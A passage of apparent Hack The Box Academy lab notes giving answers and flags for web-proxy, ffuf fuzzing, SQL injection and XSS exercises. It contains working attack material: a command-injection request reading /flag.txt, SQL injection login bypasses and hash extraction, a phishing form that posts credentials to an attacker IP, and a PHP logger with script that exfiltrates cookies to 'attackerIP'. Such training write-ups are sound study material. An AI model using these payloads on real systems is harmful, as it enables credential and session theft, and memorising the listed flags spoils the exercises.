# Then, to set a proxy for any exploit within Metasploitwith the `set PROXIES` flag. 
set PROXIES HTTP:127.0.0.1:8080

use auxiliary/scanner/http/http_put

set RHOSTS https://academy.hackthebox.com/

run
```

Results: msf test file


### Burp Intruder

**Use Burp Intruder to fuzz for '.html' files under the /admin directory, to find a file containing the flag.**

This is the request

```
GET /admin/§flag§.html HTTP/1.1
Host: 94.237.59.246:39867
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```

In Burp Intruder set a Snipper attack. Use common.txt as payload. Run it and payload 2010 will return the flag.

Results: HTB{burp_1n7rud3r_fuzz3r!}

 
### ZAP Fuzzer

**The directory we found above sets the cookie to the md5 hash of the username, as we can see the md5 cookie in the request for the (guest) user. Visit '/skills/' to get a request with a cookie, then try to use ZAP Fuzzer to fuzz the cookie for different md5 hashed usernames to get the flag. Use the "top-usernames-shortlist.txt" wordlist from Seclists.**

Results: HTB{fuzz1n6_my_f1r57_c00k13}

### ZAP Scanner

**Run ZAP Scanner on the target above to identify directories and potential vulnerabilities. Once you find the high-level vulnerability, try to use it to read the flag at '/flag.txt'**. 

The vulnerable endpoint contains a command injection vulnerability. This is the request: 

```
GET /devtools/ping.php?ip=|+cat+/flag.txt HTTP/1.1
Host: 94.237.54.253:52356
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://94.237.54.253:52356/index.php/2021/08/11/customer-support/
Upgrade-Insecure-Requests: 1

```

And this is the response:

```
HTTP/1.1 200 OK
Date: Tue, 22 Oct 2024 16:54:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 156
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>

<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Ping</title>
</head>

<body>
  HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
</body>

</html>
```

Results: HTB{5c4nn3r5_f1nd_vuln5_w3_m155}


### Skills Assessment - Using Web Proxies

**The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.**. 

```
# Intercept traffic qith Burpsuite. Go to the website http://$ip:$port/lucky.php and remove in source code "disabled=""". Then click on the button. You will get a POST request to lucky.php in your intercepted traffic. Send it to Repeater module. Click on Send. Within the response, you will see:
<p style="text-align:center">HTB{d154bl3d_bu770n5_w0n7_570p_m3}</p>
```

Results: HTB{d154bl3d_bu770n5_w0n7_570p_m3}


The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.. 

```
#  Intercept traffic qith Burpsuite. Go to the website http://$ip:$port/admin.php. See the "Set-Cookie: cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d"

# Use Decoder. First, decode as ASCII hex, you will get:
M2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ==

# Use Decoder. Second, decode as Base64, you will get:
3dac93b8cd250aa8c1a36fffc79a17a
```

Results: 3dac93b8cd250aa8c1a36fffc79a17a


**Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the "alphanum-case.txt" wordlist from Seclist for the payload).** 

![](img/proxy_00.png)

![](img/proxy_01.png)

Results:            HTB{burp_1n7rud3r_n1nj4!}

**You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'?**. 

```
msfconsole -q
use auxiliary/scanner/http/coldfusion_locale_traversal
options
set RHOSTS $ip
set RPORT $port
set PROXIES HTTP:127.0.0.1:8080

# Go to Burpsuite and check out the request
GET /CFIDE/administrator/index.cfm HTTP/1.1
Host: 94.237.62.154:37883
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0
Connection: close
```

Results: CFIDE


## [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54)

### Basic Fuzzing

#### Directory fuzzing

**In addition to the directory we found above, there is another directory that can be found. What is it?**

``` shell-session 
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -u http://$ip:$port/FUZZ
```

Results: forum

#### Page fuzzing


**Try to use what you learned in this section to fuzz the '/blog' directory and find all pages. One of them should contain a flag. What is the flag?.**

``` shell-session 
# Find the extension in use
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://$ip:$port/blog/indexFUZZ

# As it is php, we will fuzz now possible existent files.php 
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$ip:$port/blog/FUZZ.php

# We obtain http://$ip:$port/blog/home.php
```

Results: HTB{bru73_f0r_c0mm0n_p455w0rd5}

#### Recursive fuzzing
**Try to repeat what you learned so far to find more files/directories. One of them should give you a flag. What is the content of the flag?.**

``` shell-session 
ffuf  -recursion -recursion-depth 1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://$ip:$port/FUZZ -e .php 

### We obtain http://$ip:$port/forum/flag.php and the flag is there. 
```

Results: HTB{fuzz1n6_7h3_w3b!}


### Domain Fuzzing
#### Subdomain fuzzing 
**Try running a sub-domain fuzzing test on 'inlanefreight.com' to find a customer sub-domain portal. What is the full domain of it?.**

``` shell-session 
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.inlanefreight.com/
```

Results: customer.inlanefreight.com

#### Filtering results
**Try running a VHost fuzzing scan on 'academy.htb', and see what other VHosts you get. What other VHosts did you get?.**

``` shell-session 
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:$port -H 'Host: FUZZ.academy.htb' -fs 986
```

Results: test.academy.htb

### Parameter fuzzing

#### Parameter fuzzing - GET
**Using what you learned in this section, run a parameter fuzzing scan on this page. what is the parameter accepted by this webpage?.**

``` shell-session 
# We enumerate:
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:$por/admin/admin.php?FUZZ=key -fs 798

# And we obtain user. We enter http://admin.academy.htb:30721/admin/admin.php?user=key and obtain the message, You don't have access to read the flag. We enter http://admin.academy.htb:30721/admin/admin.php?user=admin and obtain the message "This method is deprecated"

ffuf -w  /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:$port/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx

```

Results: user

#### Value  fuzzing
**Try to create the 'ids.txt' wordlist, identify the accepted value with a fuzzing scan, and then use it in a 'POST' request with 'curl' to collect the flag. What is the content of the flag?.**

``` shell-session 
# First create a list of 1000 id values, from 1 to 1000
for i in $(seq 1 1000); do echo $i >> ids.txt; done
# Now, fuzz
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:$port/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
# it will return the payload 73. Now with curl:
curl http://admin.academy.htb:$port/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded' 
```

Results: HTB{p4r4m373r_fuzz1n6_15_k3y!}


### Skills assessment - Web fuzzing

**Run a sub-domain/vhost fuzzing scan on '*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name).**

``` shell-session 
ffuf -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:$port/ -H 'Host: FUZZ.academy.htb' -fs 985
```

Results: test archive faculty

**Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?.**

``` shell-session 
ffuf -w  /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://academy.htb:$port/indexFUZZ -H 'Host:test.academy.htb'
ffuf -w  /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://academy.htb:$port/indexFUZZ -H 'Host:archive.academy.htb'
ffuf -w  /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://academy.htb:$port/indexFUZZ -H 'Host:faculty.academy.htb'
```

Results: php phps php7

** One of the pages you will identify should say 'You don't have access!'. What is the full page URL?.**

``` shell-session 
ffuf -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://faculty.academy.htb:$port/FUZZ  -recursion -recursion-depth 1 -e .php,.php7,.phps -fc 403

```

Results:  http://faculty.academy.htb:PORT/courses/linux-security.php7

** In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?.**

``` shell-session 
# First, we fuzz parameters:
ffuf -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://faculty.academy.htb:$port/courses/linux-security.php7?FUZZ=1   -fs 774

# We obtain user. We enter http://faculty.academy.htb:$port/courses/linux-security.php7?user=admin in the browsers. When accessing, we read the message "This method is no longer used." printed on the screen. So we try to FUZZ the value of the user parameter with the POST method
ffuf -w  /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ  -u "http://faculty.academy.htb:$port/courses/linux-security.php7"  -X POST -d "FUZZ=key" -H 'Content-Type: application/x-www-form-urlencoded'  -fs 774 

```

Results:  user, username


**Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?.**

``` shell-session 
ffuf -w  /usr/share/seclists/Usernames/Names/names.txt:FUZZ  -u "http://faculty.academy.htb:$port/courses/linux-security.php7"  -X POST -d "username=FUZZ" -H 'Content-Type: application/x-www-form-urlencoded'  -fs 781

# This returns 'harry'. Now we curl that url
curl  "http://faculty.academy.htb:$port/courses/linux-security.php7"  -X POST -d "username=harry"  
```

Results:  HTB{w3b_fuzz1n6_m4573r}



## [Login Brute Forcing](https://academy.hackthebox.com/module/details/57)


## [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33)

### MySQL

Authenticate to 83.136.255.194:55762 with user "root" and password "password"
**Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?**

```
mysql -u root -h $ip -P $port -ppassword
show databases;
```

Results: employees

**What is the department number for the 'Development' department?**

```
mysql -u root -h $ip -P $port -ppassword
show databases;
show tables;
select * from departments;
```

Results: d005

**What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?**

```
mysql -u root -h $ip -P $port -ppassword
show databases;
show tables;
select * from employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';
```

Results: Mitchem

**In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?**

```
mysql -u root -h $ip -P $port -ppassword
SELECT * from titles WHERE (emp_no > 10000 OR title NOT LIKE 'Engineer');
```

Results: 654

### SQL Injections

**Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?**

```
# Username
tom' OR '1'='1

# Password
lala
```

Results:  202a1d1a8b195d5e9a57e434cc16000c


**Login as the user with the id 5 to get the flag.**

```
# Username
' or id=5)#
# Leave password empty
```

Results:  cdad9ecdf6f14b45ff5c4de32909caec

Authenticate to `$ip:$port` with user "root" and password "password". Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.

```
mysql -u root -h $ip -P $port -ppassword

show databases;
use employees;
describe employees;
describe departments;
SELECT dept_no,dept_name,NULL,NULL,NULL,NULL from departments UNION select * FROM employees;
```

Results: 663


**Use a Union injection to get the result of 'user()'**

```
' ORDER BY 1;#
' ORDER BY 2;#
' ORDER BY 3;#
' ORDER BY 4;#
' ORDER BY 5;#

# With 5 columns it will return an error, so it has 4 columns

# Check out which ones are printed with
' UNION select 1,2,3,4;#

# The UI will give you columns 2,3,4. Inject the code there
' UNION select 1,user(),@@version,4;#

```

Results: root@localhost

### Exploitation

**What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?**

```
# This comes from the previous exercise...

# Get all the columns from the table users
cn' UNION select 1,column_name,3,4 from information_schema.columns WHERE table_name='users'-- -

# Get id, username and password from table users:
cn' UNION select 1,id,username,password from users-- -
```

| **Port Code** |     |     | **Port City** |     |     | **Port Volume**                  |     |     |
| ------------- | --- | --- | ------------- | --- | --- | -------------------------------- | --- | --- |
| 1             |     |     | admin         |     |     | 392037dbba51f692776d6cefb6dd546d |     |     |
| 2             |     |     | newuser       |     |     | 9da2c9bcdf39d8610954e0e11ea8f45f |     |     |

Results:  9da2c9bcdf39d8610954e0e11ea8f45f





## [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/details/103)


### XSS Basics

####  Stored XSS


**To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

```
<script>alert(document.cookie)</script>
```

Results:  HTB{570r3d_f0r_3v3ry0n3_70_533}


####  Reflected XSS


**To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

```
http://83.136.253.163:57837/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

Results: HTB{r3fl3c73d_b4ck_2_m3}

####  DOM XSS

 To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.
 
```
# Enter <img src="" onerror=alert(document.cookie)>
```

Results: 


####  XSS Discovery

**Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?**

```
# Enter http://$ip:$port/?fullname=lolo&username=lala&password=lalala&email=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

Results: email


**What type of XSS was found on the above server? "name only"**

Results:  Reflected

### XSS Attacks

#### Phishing 

**Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.**

Creating a valid payload in http://10.129.148.221/phishing/index.php?url= This would be the payload:

```
\`/'</script/--!><h3>Please login to continue</h3><form action=http://10.10.14.198>    <input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>
```

This would be the link generated:

```
http://10.129.148.221/phishing/index.php?url=%5C%60%2F%27%3C%2Fscript%2F--%21%3E%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.198%3E++++%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E

```

Starting a netcat listener:

```
sudo nc -lvnp 80
```

Visiting http://10.129.148.221/phishing/send.php and entering the link generated.

In the netcat  listener we obtain:

```
listening on [any] 80 ...
connect to [10.10.14.198] from (UNKNOWN) [10.129.148.221] 46802
GET /?username=admin&password=p1zd0nt57341myp455&submit=Login HTTP/1.1
Host: 10.10.14.198
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: HTBXSS/1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.129.148.221/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

```

We use the creds for accessing to /phishing/login.php and grabbing the flag

Results: HTB{r3f13c73d_cr3d5_84ck_2_m3}

#### Session Hijacking

**Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.**

Create a file index.php in the attacker machine:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Have a php server listening:

```bash
sudo php -S 0.0.0.0:80
```


Enter $ip/hijacking and enter this payload in every field. Use the field name (username, name, surname...) as `<custom.name>` when different payloads:

```html
<script>document.location=%27http://attackerIP/index.php?c=%27+document.cookie</script>
```



If successful, you will see a connection in your php server like this:

![xss blind](img/xss_blind_00.png)

Then, `profile` would be the vulnerable input (parameter `imgurl`). The URL:

```
http://VICTIMIP/hijacking/?fullname=Lala%20lalasurname%2Ffullname%3C%2Fscript%3E&username=%22%3E%3Cscript+src%3Dhttp%3A%2F%2FAttackerIP%2Fusername%3C%2Fscript%3E&password=lala&email=lala%40gmail.com&imgurl=%22%3E%3Cscript%20src=%22http://AttackerIP/lala.js%22%3E%3C/script%3E
```

Beside the index.php, have a lala.js in your php server:

```js
new Image().src='http://attackerIP/index.php?c='+document.cookie
```

Run your php server:

```bash
sudo php -S 0.0.0.0:80
```

Now, we can change the URL in the XSS payload we found earlier to use `lala.js`. For instance:

```html
<script src=http://attackerIP/lala.js></script>
```

You will log the following activity in your php server:

![xss blind](img/xss_blind_02.png)


Results:  HTB{4lw4y5_53cur3_y0ur_c00k135}


### XSS Prevention

####  Skills Assessment


**What is the value of the 'flag' cookie?**

Enter payload in all form fields. The vulnerable one is `website` with the payload

```html
<script src='http://attackerIP/website'></script>
```

I have a php server running, with this index.php:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

I know that it is the parameter `webserver` because of this:

![xss_blind_01](img/xss_blind_01.png)

Now, I have also this file lala.js in my server:

```
<script src='http://attackerIP/lala.js'></script>
```

And in my php server:

![xss_blind_03](img/xss_blind_03.png)

Results:  HTB{cr055_5173_5cr1p71n6_n1nj4}




## [File Inclusion](https://academy.hackthebox.com/module/details/23)


## [File Upload Attacks](https://academy.hackthebox.com/module/details/136)


## [Command Injections](https://academy.hackthebox.com/module/details/109)


##  [Web Attacks](https://academy.hackthebox.com/module/details/134)


## [Attacking Common Applications](https://academy.hackthebox.com/module/details/113)


## [Linux Privilege Escalation](https://academy.hackthebox.com/module/details/51)


## [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67)


## [Documentation & Reporting](https://academy.hackthebox.com/module/details/162)


##  [Attacking Enterprise Networks](https://academy.hackthebox.com/module/details/163)



Question

```

```

Results: 

